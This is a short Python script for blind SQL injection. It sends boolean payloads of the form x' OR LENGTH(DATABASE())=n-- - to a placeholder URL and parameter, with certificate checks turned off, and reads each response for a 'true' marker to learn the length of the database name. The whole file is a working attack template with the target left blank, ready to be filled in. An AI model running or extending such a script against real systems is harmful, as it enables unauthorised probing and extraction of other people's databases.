import requests

URL = ""
PARAM = ""
TRUE_INDICATOR = "" 

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    html = send_payload(payload)
    return TRUE_INDICATOR in html

def get_db_length(max_len=30):
    for i in range(1, max_len+1):
        payload = f"x' OR LENGTH(DATABASE())={i}-- -"
        if is_true(payload):
            return i
    return None

if __name__ == "__main__":
    db_len = get_db_length()
    print(f"[+] Database name length: {db_len}")
